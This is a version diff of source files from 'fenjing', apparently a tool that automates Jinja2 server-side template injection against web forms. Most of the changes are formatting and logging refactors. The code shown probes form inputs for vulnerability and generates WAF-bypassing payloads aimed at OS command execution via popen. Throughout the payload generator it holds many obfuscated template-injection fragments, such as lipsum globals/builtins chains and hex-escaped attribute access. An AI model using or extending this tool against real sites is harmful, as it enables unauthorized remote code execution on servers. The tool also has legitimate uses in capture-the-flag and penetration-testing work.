+        assert resp is not None
+        return self.test_result in resp.text
 
     def crack_inputs(self, input_field: str) -> Union[Result, None]:
         """攻击对应的input
 
         Args:
             input_field (str): 需要攻击的input
 
         Returns:
             Union[Result, None]: 对应的payload生成函数，以及对应的input
         """
-        logger.info(f"Testing {colored('yellow', input_field)}")
+        logger.info("Testing %s", colored("yellow", input_field))
 
         waf_func = self.waf_func_gen.generate(input_field)
         full_payload_gen = FullPayloadGen(waf_func, callback=self.callback)
         payload, will_print = full_payload_gen.generate(
-            OS_POPEN_READ, self.test_cmd)
+            OS_POPEN_READ, self.test_cmd
+        )
         if payload is None:
-            self.callback(CALLBACK_TEST_FORM_INPUT, {
-                "ok": False,
-            })
+            self.callback(
+                CALLBACK_TEST_FORM_INPUT,
+                {
+                    "ok": False,
+                },
+            )
             return None
-
-        is_test_success = None  # payload测试成功时为True, 失败时为False, 无法测试为None
+        # payload测试成功时为True, 失败时为False, 无法测试为None
+        is_test_success = None
         if will_print:
             if self.test_input(input_field, payload):
                 logger.info(
-                    f"{colored('green', 'Success!', bold=True)} Now we can generate payloads.")
+                    "%s Now we can generate payloads.",
+                    colored("green", "Success!", bold=True),
+                )
                 is_test_success = True
             else:
                 logger.info(
-                    f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
+                    "%s! Generated payloads might be useless.",
+                    colored("yellow", "Test Payload Failed", bold=True),
+                )
         else:
             logger.info(
-                f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
-                "You can try generating payloads anyway.")
-
-        self.callback(CALLBACK_TEST_FORM_INPUT, {
-            "ok": True,
-            "will_print": will_print,
-            "test_success": is_test_success,
-            "input_field": input_field
-        })
+                "Input %s looks great, "
+                + "but we WON'T SEE the execution result! "
+                + "You can try generating payloads anyway.",
+                input_field,
+            )
+
+        self.callback(
+            CALLBACK_TEST_FORM_INPUT,
+            {
+                "ok": True,
+                "will_print": will_print,
+                "test_success": is_test_success,
+                "input_field": input_field,
+            },
+        )
         return Result(
-            full_payload_gen=full_payload_gen,
-            input_field=input_field
+            full_payload_gen=full_payload_gen, input_field=input_field
         )
 
     def crack(self) -> Union[Result, None]:
         """攻击表单
 
         Returns:
             Union[Result, None]: 对应的payload生成函数，以及对应的input
         """
-        logger.info(f"Start cracking {self.form}")
+        logger.info("Start cracking %s", self.form)
         vulunables = self.vulunable_inputs()
         logger.info(
-            f"These inputs might be vulunable: {colored('yellow', repr(vulunables))}")
+            "These inputs might be vulunable: %s",
+            colored("yellow", repr(vulunables)),
+        )
 
         for input_field in vulunables:
             result = self.crack_inputs(input_field)
             if result:
                 return result
-        logger.warning(f"Failed...")
+        logger.warning("Failed...")
         return None
```

### Comparing `fenjing-0.4.2/fenjing/full_payload_gen.py` & `fenjing-0.4.3/fenjing/full_payload_gen.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,81 +1,119 @@
-from typing import Callable, List, Tuple, Union, Dict, Any
+"""完整payload的生成器，生成包括双花括号在内的所有部分
+
+"""
+
+from typing import Callable, Tuple, Union, Dict, Any
 import logging
 
 from . import payload_gen
 from .colorize import colored
-from .context_vars import context_vars_all, filter_by_used_context, filter_by_waf
-from .const import *
+from .context_vars import (
+    context_payloads_all,
+    filter_by_used_context,
+    filter_by_waf,
+)
+from .const import (
+    CALLBACK_PREPARE_FULLPAYLOADGEN,
+    CALLBACK_GENERATE_FULLPAYLOAD,
+)
 
 logger = logging.getLogger("shell_payload")
 
 
-# def get_int_context(waf_func):
-#     ints, var_names, payloads = get_passed_int_vars(waf_func)
-#     print(ints, var_names, payloads)
-#     if len(ints) == 0:
-#         logger.warning("No IntVars For YOU!")
-#     return dict(zip(var_names, payloads)), dict(zip(var_names, ints))
-
-
-# def get_str_context(waf_func):
-#     str_vars = [
-#         ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
-#         ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
-#          "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
-#          "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
-#          "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
-#         # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
-#     ]
-#     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
-#     return {var_name: payload for var_name, _, payload in str_vars}, {var_name: var_value for var_name, var_value, _ in str_vars}
+def get_outer_pattern(
+    waf_func: Callable,
+) -> Union[Tuple[str, bool], Tuple[None, None]]:
+    """根据WAF函数获取payload最外层的结构，一般为双花括号
 
+    Args:
+        waf_func (Callable): WAF函数
 
-def get_outer_pattern(waf_func):
+    Returns:
+        Union[Tuple[str, bool], Tuple[None, None]]:
+            最外层的结构，以及这个结构是否会产生回显
+            生成失败则返回None
+    """
     outer_payloads = [
         ("{{}}", "{{PAYLOAD}}", True),
         ("{%print()%}", "{%print(PAYLOAD)%}", True),
         ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
         ("{% set x= %}", "{% set x=PAYLOAD %}", False),
     ]
     for test_payload, outer_pattern, will_print in outer_payloads:
         if waf_func(test_payload):
             return outer_pattern, will_print
-    else:
-        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
-        return None, None
+    logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
+    return None, None
 
-def context_payloads_to_context(context_payload: Dict[str, Dict[str, Any]]) -> Dict[str, Any]:
+
+def context_payloads_to_context(
+    context_payload: Dict[str, Dict[str, Any]]
+) -> Dict[str, Any]:
     """将context_payload转换成context字典。
 
     Args:
         context_payload (Dict[str, Dict[str, Any]]): 一个存储着payload以及对应上下文的字典
 
     Returns:
         Dict[str, Any]: 一个字典，键是变量名，值是变量值
     """
-    return {var_name: var_value for _, d in context_payload.items() for var_name, var_value in d.items()}
+    return {
+        var_name: var_value
+        for _, d in context_payload.items()
+        for var_name, var_value in d.items()
+    }
 
 
 class FullPayloadGen:
     """接受一个waf函数并负责生成payload
     waf函数接受一个字符串并返回这个字符串是否可以通过WAF
     payload由两部分组成：
         - 前方提供变量等上下文的上下文payload（一般为{%set xxx=xxx%}的形式）
         - 以及后方实际发挥作用的作用payload（一般被双花括号{{}}包裹）
     """
-    def __init__(self, waf_func: Callable[[str, ], bool], callback: Union[Callable[[str, Dict], None], None] = None):
+
+    def __init__(
+        self,
+        waf_func: Callable[
+            [
+                str,
+            ],
+            bool,
+        ],
+        callback: Union[Callable[[str, Dict], None], None] = None,
+    ):
+        self.__slot__ = [
+            "waf_func",
+            "prepared",
+            "_callback",
+            "context_payload",
+            "context",
+            "outer_pattern",
+            "will_print",
+        ]
         self.waf_func = waf_func
         self.prepared = False
-        self._callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)
+        self._callback: Callable[[str, Dict], None] = (
+            callback if callback else (lambda x, y: None)
+        )
+        self.context_payload = context_payloads_all
+        self.context = context_payloads_to_context(self.context_payload)
+        self.outer_pattern, self.will_print = None, None
+        self.payload_gen = None
 
     @property
     def callback(self):
+        """Callback函数，在进行某些步骤是会被调用以传递运行时的信息
+
+        Returns:
+            Callable: callback函数
+        """
         return self._callback
-    
+
     @callback.setter
     def callback(self, callback):
         self._callback = callback
         if self.payload_gen:
             self.payload_gen.callback = callback
 
     def do_prepare(self) -> bool:
@@ -83,87 +121,112 @@
 
         Returns:
             bool: 是否生成成功，失败则无法生成payload。
         """
         if self.prepared:
             return True
 
-        self.context_payload = filter_by_waf(context_vars_all, self.waf_func)
+        self.context_payload = filter_by_waf(
+            self.context_payload, self.waf_func
+        )
 
         self.context = context_payloads_to_context(self.context_payload)
 
         self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
         if not self.outer_pattern:
             return False
         if self.will_print:
-            logger.info(f"use {colored('blue', self.outer_pattern)}")
+            logger.info("use %s", colored("blue", self.outer_pattern))
         else:
             logger.warning(
-                f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")
+                "use %s, which %s your result!",
+                colored("blue", self.outer_pattern),
+                colored("red", "will not print"),
+            )
 
-        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context, self.callback)
+        self.payload_gen = payload_gen.PayloadGenerator(
+            self.waf_func, self.context, self.callback
+        )
         self.prepared = True
-        self.callback(CALLBACK_PREPARE_FULLPAYLOADGEN, {
-            "context": self.context,
-            "outer_pattern": self.outer_pattern,
-            "will_print": self.will_print,
-        })
+        self.callback(
+            CALLBACK_PREPARE_FULLPAYLOADGEN,
+            {
+                "context": self.context,
+                "outer_pattern": self.outer_pattern,
+                "will_print": self.will_print,
+            },
+        )
         return True
 
-    def add_context_variable(self, payload: str, context_vars: Dict[str, Any], check_waf: bool = True) -> bool:
+    def add_context_variable(
+        self,
+        payload: str,
+        context_vars: Dict[str, Any],
+        check_waf: bool = True,
+    ) -> bool:
         """将提供上下文变量以及对应payload加入payload生成器中，需要先调用.do_prepare函数
 
         Args:
             payload (str): 上下文变量对应的payload
             context_vars (Dict[str, Any]): 所有上下文变量，键是变量名，值是变量值
-            check_waf (bool, optional): 是否使用waf函数检查传入的payload. Defaults to True.
+            check_waf (bool, optional):
+                是否使用waf函数检查传入的payload. Defaults to True.
 
         Raises:
             Exception: 需要先调用.do_prepare函数，否则抛出exception
 
         Returns:
             bool: 是否通过waf函数，不检查waf则永远为True
         """
         if not self.prepared:
-            raise Exception("Please run .do_prepare() first")
+            raise RuntimeError("Please run .do_prepare() first")
         if check_waf and self.waf_func(payload):
             return False
         self.context_payload[payload] = context_vars
         self.context = context_payloads_to_context(self.context_payload)
         return True
 
-    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
+    def generate(
+        self, gen_type, *args
+    ) -> Tuple[Union[str, None], Union[bool, None]]:
         """根据要求生成payload
 
         Args:
             gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型
 
         Returns:
-            Tuple[Union[str, None], Union[bool, None]]: payload, 以及payload是否会有回显
+            Tuple[Union[str, None], Union[bool, None]]:
+                payload, 以及payload是否会有回显
         """
         if not self.prepared and not self.do_prepare():
             return None, None
 
+        assert (
+            self.payload_gen is not None
+        ), "when prepared, we should have payload_gen"
+
         ret = self.payload_gen.generate_with_used_context(gen_type, *args)
 
         if ret is None:
             logger.warning("Bypassing WAF Failed.")
             return None, None
         inner_payload, used_context = ret
-        context_payload = "".join(filter_by_used_context(self.context_payload, used_context).keys())
+        context_payload = "".join(
+            filter_by_used_context(self.context_payload, used_context).keys()
+        )
         assert isinstance(self.outer_pattern, str)
 
-        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)
-
-        self.callback(CALLBACK_GENERATE_FULLPAYLOAD, {
-            "gen_type": gen_type,
-            "args": args,
-            "payload": payload,
-            "will_print": self.will_print,
-        })
-
-        return (
-            payload, 
-            self.will_print
+        payload = context_payload + self.outer_pattern.replace(
+            "PAYLOAD", inner_payload
         )
 
+        self.callback(
+            CALLBACK_GENERATE_FULLPAYLOAD,
+            {
+                "gen_type": gen_type,
+                "args": args,
+                "payload": payload,
+                "will_print": self.will_print,
+            },
+        )
 
+        return (payload, self.will_print)
```

### Comparing `fenjing-0.4.2/fenjing/payload_gen.py` & `fenjing-0.4.3/fenjing/payload_gen.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,13 +1,14 @@
+# pylint: skip-file
+# flake8: noqa
 from collections import defaultdict
-from typing import Callable, DefaultDict, List, Dict, Union, Any
+from typing import Callable, DefaultDict, List, Dict, Union, Any, Tuple
 import re
 import time
 import logging
-from typing import Callable, Any, Dict, Tuple
 from .colorize import colored
 from .const import *
 
 ContextVariable = Dict[str, Any]
 ReqGenRequirement = Tuple
 
 ReqGenRequirements = List[ReqGenRequirement]
@@ -15,476 +16,428 @@
 ReqGen = Callable[..., ReqGenReturn]
 ReqGenResult = Tuple[str, ContextVariable]
 
 req_gens: DefaultDict[str, List[ReqGen]] = defaultdict(list)
 used_count = defaultdict(int)
 logger = logging.getLogger("payload_gen")
 
+
 def req_gen(f: ReqGen):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
-        raise Exception(
-            f"Error found when register payload generator {f.__name__}")
+        raise Exception(f"Error found when register payload generator {f.__name__}")
     req_gens[gen_type.group(1)].append(f)
 
+
 def hashable(o):
     try:
         _ = hash(o)
         return True
     except Exception:
         return False
 
 
 class PayloadGenerator:
     def __init__(
         self,
         waf_func: Callable[[str], bool],
         context: Union[Dict, None],
-        callback: Union[Callable[[str, Dict], None], None] = None
+        callback: Union[Callable[[str, Dict], None], None] = None,
     ):
         self.waf_func = waf_func
         self.context = context if context else {}
         self.cache = {}
-        self.generate_funcs: List[Tuple[
-            Callable[[ReqGenRequirement], bool],
-            Callable[[ReqGenRequirement], Union[ReqGenResult, None]]
-        ]]
+        self.generate_funcs: List[
+            Tuple[
+                Callable[[ReqGenRequirement], bool],
+                Callable[[ReqGenRequirement], Union[ReqGenResult, None]],
+            ]
+        ]
         self.generate_funcs = [
             (
                 (lambda gen_req: gen_req[0] == LITERAL),
-                (lambda gen_req: (gen_req[1], {}))
-            ),
-            (
-                (lambda gen_req: gen_req[0] == UNSATISFIED),
-                (lambda gen_req: None)
+                (lambda gen_req: (gen_req[1], {})),
             ),
+            ((lambda gen_req: gen_req[0] == UNSATISFIED), (lambda gen_req: None)),
             (
                 (lambda gen_req: gen_req[0] == WITH_CONTEXT_VAR),
-                (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]}))
+                (lambda gen_req: ("", {gen_req[1]: self.context[gen_req[1]]})),
             ),
             (
                 (lambda gen_req: hashable(gen_req) and gen_req in self.cache),
-                (lambda gen_req: self.cache[gen_req])
+                (lambda gen_req: self.cache[gen_req]),
             ),
-            (
-                (lambda gen_req: True),
-                self.common_generate
-            )
+            ((lambda gen_req: True), self.common_generate),
         ]
-            # LITERAL: self.literal_generate,
-            # UNSATISFIED: self.unsatisfied_generate
-        
+        # LITERAL: self.literal_generate,
+        # UNSATISFIED: self.unsatisfied_generate
+
         self.callback = callback if callback else (lambda x, y: None)
 
-    def generate_by_list(self, req_list: List[ReqGenRequirement]) -> Union[ReqGenResult, None]:
+    def generate_by_list(
+        self, req_list: List[ReqGenRequirement]
+    ) -> Union[ReqGenResult, None]:
         str_result, used_context = "", {}
         for req in req_list:
             for checker, runner in self.generate_funcs:
                 if not checker(req):
                     continue
                 result = runner(req)
                 if result is None:
                     return None
                 s, c = result
                 # if not self.waf_func(s):
-                    # return None
+                # return None
                 str_result += s
                 used_context.update(c)
                 break
             else:
                 raise Exception("it shouldn't runs this line")
         if not self.waf_func(str_result):
             return None
         return str_result, used_context
 
     def common_generate(self, gen_req: ReqGenRequirement) -> Union[ReqGenResult, None]:
-
         gen_type: str
         gen_type, *args = gen_req
         if gen_type not in req_gens or len(req_gens[gen_type]) == 0:
             logger.error("Unknown type: %s", gen_type)
             return None
 
         gens = req_gens[gen_type].copy()
-        gens.sort(key = lambda gen: used_count[gen.__name__], reverse=True)
+        gens.sort(key=lambda gen: used_count[gen.__name__], reverse=True)
         for gen in gens:
             ret = self.generate_by_list(gen(self.context, *args))
             if ret is None:
                 continue
             result = ret[0]
-            self.callback(CALLBACK_GENERATE_PAYLOAD, {
-                "gen_type": gen_type,
-                "args": args,
-                "payload": result
-            })
+            self.callback(
+                CALLBACK_GENERATE_PAYLOAD,
+                {"gen_type": gen_type, "args": args, "payload": result},
+            )
             # 为了日志的简洁，仅打印一部分日志
             if gen_type in (INTEGER, STRING) and result != str(args[0]):
-                logger.info("{great}, {gen_type}({args_repl}) can be {result}".format(
-                    great=colored("green", "Great"),
-                    gen_type=colored("yellow", gen_type, bold=True),
-                    args_repl=colored("yellow", ", ".join(repr(arg)
-                                        for arg in args)),
-                    result=colored("blue", result)
-                ))
-
-            elif gen_type in (EVAL_FUNC, EVAL, CONFIG, MODULE_OS, OS_POPEN_OBJ, OS_POPEN_READ):
-                logger.info("{great}, we generate {gen_type}({args_repl})".format(
-                    great=colored("green", "Great"),
-                    gen_type=colored("yellow", gen_type, bold=True),
-                    args_repl=colored("yellow", ", ".join(repr(arg)
-                                        for arg in args)),
-                ))
-        
+                logger.info(
+                    "{great}, {gen_type}({args_repl}) can be {result}".format(
+                        great=colored("green", "Great"),
+                        gen_type=colored("yellow", gen_type, bold=True),
+                        args_repl=colored(
+                            "yellow", ", ".join(repr(arg) for arg in args)
+                        ),
+                        result=colored("blue", result),
+                    )
+                )
+
+            elif gen_type in (
+                EVAL_FUNC,
+                EVAL,
+                CONFIG,
+                MODULE_OS,
+                OS_POPEN_OBJ,
+                OS_POPEN_READ,
+            ):
+                logger.info(
+                    "{great}, we generate {gen_type}({args_repl})".format(
+                        great=colored("green", "Great"),
+                        gen_type=colored("yellow", gen_type, bold=True),
+                        args_repl=colored(
+                            "yellow", ", ".join(repr(arg) for arg in args)
+                        ),
+                    )
+                )
+
             if hashable(gen_req):
                 self.cache[gen_req] = ret
             used_count[gen.__name__] += 1
             return ret
-        
-        logger.warning("{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
-            failed=colored("red", "failed"),
-            gen_type=gen_type,
-            args_repl=", ".join(repr(arg) for arg in args),
-        ))
-        return None
 
+        logger.warning(
+            "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
+                failed=colored("red", "failed"),
+                gen_type=gen_type,
+                args_repl=", ".join(repr(arg) for arg in args),
+            )
+        )
+        return None
 
-    def generate(self, gen_type, *args) ->  Union[str, None]:
-        result = self.generate_by_list([
-            (gen_type, *args)
-        ])
+    def generate(self, gen_type, *args) -> Union[str, None]:
+        result = self.generate_by_list([(gen_type, *args)])
         if result is None:
             return None
         s, c = result
         return s
 
-    def generate_with_used_context(self, gen_type, *args) ->  Union[ReqGenResult, None]:
-        result = self.generate_by_list([
-            (gen_type, *args)
-        ])
+    def generate_with_used_context(self, gen_type, *args) -> Union[ReqGenResult, None]:
+        result = self.generate_by_list([(gen_type, *args)])
         if result is None:
             return None
         s, c = result
         return s, c
 
 
-
-def generate(gen_type, *args, waf_func: Callable, context: Union[dict, None] = None) -> Union[str, None]:
+def generate(
+    gen_type, *args, waf_func: Callable, context: Union[dict, None] = None
+) -> Union[str, None]:
     payload_generator = PayloadGenerator(waf_func, context)
     return payload_generator.generate(gen_type, *args)
 
+
 # ---
 
+
 @req_gen
 def gen_string_string_concat_plus(context: dict):
-    return [
-        (LITERAL, "+")
-    ]
+    return [(LITERAL, "+")]
 
 
 @req_gen
 def gen_string_string_concat_wave(context: dict):
-    return [
-        (LITERAL, "~")
-    ]
+    return [(LITERAL, "~")]
 
 
 # ---
 
+
 @req_gen
 def gen_formular_sum_add(context, num_list):
-    return [
-        (LITERAL, "({})".format("+".join(str(n) for n in num_list)))
-    ]
+    return [(LITERAL, "({})".format("+".join(str(n) for n in num_list)))]
 
 
 @req_gen
 def gen_formular_sum_addfunc(context, num_list):
     num_list = [
-        str(n) if i == 0 else ".__add__({})".format(n)
-        for i, n in enumerate(num_list)
-    ]
-    return [
-        (LITERAL, "({})".format(
-            "".join(num_list)
-        ))
+        str(n) if i == 0 else ".__add__({})".format(n) for i, n in enumerate(num_list)
     ]
+    return [(LITERAL, "({})".format("".join(num_list)))]
 
 
 @req_gen
 def gen_formular_sum_attraddfund(context, num_list):
     num_list = [
-        str(n) if i == 0 else f"|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")({n})"
+        str(n) if i == 0 else f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
         for i, n in enumerate(num_list)
     ]
-    return [
-        (LITERAL, "({})".format(
-            "".join(num_list)
-        ))
-    ]
+    return [(LITERAL, "({})".format("".join(num_list)))]
 
 
 @req_gen
 def gen_formular_sum_tuplesum(context, num_list):
     if len(num_list) == 1:
-        return [
-            (LITERAL, str(num_list[0]))
-        ]
-    payload = "(({})|sum)".format(
-        ",".join(num_list)
-    )
-    return [
-        (LITERAL, payload)
-    ]
+        return [(LITERAL, str(num_list[0]))]
+    payload = "(({})|sum)".format(",".join(num_list))
+    return [(LITERAL, payload)]
+
 
 # ---
 
 
 @req_gen
 def gen_zero_literal(context: dict):
-    return [
-        (LITERAL, "0")
-    ]
+    return [(LITERAL, "0")]
 
 
 @req_gen
 def gen_zero_2(context: dict):
-    return [
-        (LITERAL, "({}|int)")
-    ]
+    return [(LITERAL, "({}|int)")]
 
 
 @req_gen
 def gen_zero_3(context: dict):
-    return [
-        (LITERAL, "(g|urlencode|length)")
-    ]
+    return [(LITERAL, "(g|urlencode|length)")]
 
 
 @req_gen
 def gen_zero_4(context: dict):
-    return [
-        (LITERAL, "({}|urlencode|count)")
-    ]
+    return [(LITERAL, "({}|urlencode|count)")]
+
 
 # ---
 
 
 @req_gen
 def gen_positive_integer_simple(context: dict, value: int):
     if value < 0:
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (LITERAL, str(value))
-    ]
+        return [(UNSATISFIED,)]
+    return [(LITERAL, str(value))]
+
 
 @req_gen
 def gen_positive_integer_hex(context: dict, value: int):
     if value < 0:
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (LITERAL, hex(value))
-    ]
+        return [(UNSATISFIED,)]
+    return [(LITERAL, hex(value))]
 
 
 @req_gen
 def gen_positive_integer_sum(context: dict, value: int):
     if value < 0:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     ints = [
-        (var_name, var_value) for var_name, var_value in context.items()
+        (var_name, var_value)
+        for var_name, var_value in context.items()
         if isinstance(var_value, int) and var_value > 0
     ]
 
     if ints == []:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     ints.sort(key=lambda pair: pair[1], reverse=True)
     value_left = value
     payload_vars = []
     while value_left != 0:
         while ints and ints[0][1] > value_left:
             ints = ints[1:]
         if not ints:
-            return [
-                (UNSATISFIED, )
-            ]
+            return [(UNSATISFIED,)]
         value_left -= ints[0][1]
         payload_vars.append(ints[0][0])
 
-    return [
-        (FORMULAR_SUM, tuple(payload_vars))
-    ] + [
+    return [(FORMULAR_SUM, tuple(payload_vars))] + [
         (WITH_CONTEXT_VAR, v) for v in payload_vars
     ]
 
+
 # ---
 
 
 @req_gen
 def gen_integer_literal(context: dict, value: int):
-    return [
-        (LITERAL, str(value))
-    ]
+    return [(LITERAL, str(value))]
 
 
 @req_gen
 def gen_integer_context(context: dict, value: int):
     if value not in context.values():
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == value][0]
     return [
         (LITERAL, v),
         (WITH_CONTEXT_VAR, v),
     ]
 
 
 @req_gen
 def gen_integer_zero(context: dict, value: int):
     if value != 0:
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (ZERO, )
-    ]
+        return [(UNSATISFIED,)]
+    return [(ZERO,)]
 
 
 @req_gen
 def gen_integer_positive(context: dict, value: int):
     if value <= 0:
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (POSITIVE_INTEGER, value)
-    ]
+        return [(UNSATISFIED,)]
+    return [(POSITIVE_INTEGER, value)]
 
 
 @req_gen
 def gen_integer_negative(context: dict, value: int):
     if value >= 0:
-        return [
-            (UNSATISFIED, )
-        ]
-    return [
-        (LITERAL, "-"),
-        (POSITIVE_INTEGER, abs(value))
-    ]
+        return [(UNSATISFIED,)]
+    return [(LITERAL, "-"), (POSITIVE_INTEGER, abs(value))]
 
 
 # @req_gen
 # def gen_integer_unicode(context: dict, value: int):
 #     dis = ord("０") - ord("0")
 #     return [
 #         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
 #     ]
 
 
 @req_gen
 def gen_integer_subtract(context: dict, value: int):
-
     ints = [
-        (var_name, var_value) for var_name, var_value in context.items()
+        (var_name, var_value)
+        for var_name, var_value in context.items()
         if isinstance(var_value, int) and var_value > 0
     ]
 
     if ints == []:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
 
     ints.sort(key=lambda pair: pair[1], reverse=True)
     bigger = [pair for pair in ints if pair[1] >= value]
     if not bigger:
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     to_sub_name, to_sub_value = min(bigger, key=lambda pair: pair[1])
     ints = [pair for pair in ints if pair[1] <= to_sub_value]
     value_left = to_sub_value - value
 
     sub_vars = []
     while value_left != 0:
         while ints and ints[0][1] > value_left:
             ints = ints[1:]
         if not ints:
-            return [
-                (UNSATISFIED, )
-            ]
+            return [(UNSATISFIED,)]
         value_left -= ints[0][1]
         sub_vars.append(ints[0][0])
     return [
-        (LITERAL, "({})".format("-".join([to_sub_name, ] + sub_vars)))
+        (
+            LITERAL,
+            "({})".format(
+                "-".join(
+                    [
+                        to_sub_name,
+                    ]
+                    + sub_vars
+                )
+            ),
+        )
     ] + [
-        (WITH_CONTEXT_VAR, v) for v in [to_sub_name, ] + sub_vars
+        (WITH_CONTEXT_VAR, v)
+        for v in [
+            to_sub_name,
+        ]
+        + sub_vars
     ]
 
 
 # ---
 
+
 @req_gen
 def gen_string_percent_literal1(context):
-    return [
-        (LITERAL, "'%'")
-    ]
+    return [(LITERAL, "'%'")]
 
 
 @req_gen
 def gen_string_percent_literal2(context):
-    return [
-        (LITERAL, '"%"')
-    ]
+    return [(LITERAL, '"%"')]
 
 
 @req_gen
 def gen_string_percent_context(context):
     if "%" not in context.values():
-        return [
-            (UNSATISFIED, )
-        ]
+        return [(UNSATISFIED,)]
     v = [k for k, v in context.items() if v == "%"][0]
-    return [
-        (LITERAL, v)
-    ] + [
-        (WITH_CONTEXT_VAR, v)
-    ]
+    return [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
 
 
 @req_gen
 def gen_string_percent_urlencode1(context):
-    return [
-        (LITERAL, "(lipsum()|urlencode|first)")
-    ]
+    return [(LITERAL, "(lipsum()|urlencode|first)")]
 
 
 @req_gen
 def gen_string_percent_urlencode2(context):
-    return [
-        (LITERAL, "({}|escape|urlencode|first)")
-    ]
+    return [(LITERAL, "({}|escape|urlencode|first)")]
 
 
 @req_gen
 def gen_string_percent_lipsum(context):
     return [
-        (LITERAL, "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
-         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
-         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
-         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))")
+        (
+            LITERAL,
+            "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
+            + "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
+            + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)"
+            + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
+        )
     ]
 
 
 @req_gen
 def gen_string_percent_lipsumcomplex(context):
     return [
         (LITERAL, "(lipsum[(lipsum|escape|batch("),
@@ -504,571 +457,551 @@
         (LITERAL, ")|list|first|last)*"),
         (INTEGER, 2),
         (LITERAL, "][dict(chr=x)|join]("),
         (INTEGER, 37),
         (LITERAL, "))"),
     ]
 
+
 @req_gen
 def gen_string_percent_urlencodelong(context):
     return [
-        (LITERAL, "((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)" + 
-            "~(lipsum|string|list|batch(15)|first|last)" + 
-            "~(lipsum|string|list|batch(20)|first|last)" + 
-            "~(x|pprint|list|batch(4)|first|last)" + 
-            "~(x|pprint|list|batch(2)|first|last)" + 
-            "~(lipsum|string|list|batch(5)|first|last)" + 
-            "~(lipsum|string|list|batch(8)|first|last)" + 
-            "~(x|pprint|list|batch(3)|first|last)" + 
-            "~(x|pprint|list|batch(4)|first|last)))|list|first|first)")
+        (
+            LITERAL,
+            "((lipsum,)|map(((lipsum|string|list|batch(3)|first|last)"
+            + "~(lipsum|string|list|batch(15)|first|last)"
+            + "~(lipsum|string|list|batch(20)|first|last)"
+            + "~(x|pprint|list|batch(4)|first|last)"
+            + "~(x|pprint|list|batch(2)|first|last)"
+            + "~(lipsum|string|list|batch(5)|first|last)"
+            + "~(lipsum|string|list|batch(8)|first|last)"
+            + "~(x|pprint|list|batch(3)|first|last)"
+            + "~(x|pprint|list|batch(4)|first|last)))|list|first|first)",
+        )
     ]
 
 
 # ---
 
 
 @req_gen
 def gen_string_lower_c_literal1(context):
-    return [
-        (LITERAL, "'c'")
-    ]
+    return [(LITERAL, "'c'")]
 
 
 @req_gen
 def gen_string_lower_c_literal2(context):
-    return [
-        (LITERAL, '"c"')
-    ]
+    return [(LITERAL, '"c"')]
 
 
 @req_gen
 def gen_string_lower_c_joindict(context):
-    return [
-        (LITERAL, '(dict(c=x)|join)')
-    ]
+    return [(LITERAL, "(dict(c=x)|join)")]
 
 
 @req_gen
 def gen_string_lower_c_lipsumurlencode(context):
-    return [
-        (LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")
-    ]
+    return [(LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")]
 
 
 @req_gen
 def gen_string_lower_c_lipsumbatch(context):
     return [
         (LITERAL, "(lipsum|escape|batch("),
         (INTEGER, 8),
-        (LITERAL, ")|first|last)")
+        (LITERAL, ")|first|last)"),
     ]
 
 
 @req_gen
 def gen_string_lower_c_joinerbatch(context):
     return [
         (LITERAL, "(joiner|string|batch("),
         (INTEGER, 2),
-        (LITERAL, ")|first|last)")
+        (LITERAL, ")|first|last)"),
     ]
 
+
 # ---
 
 
 @req_gen
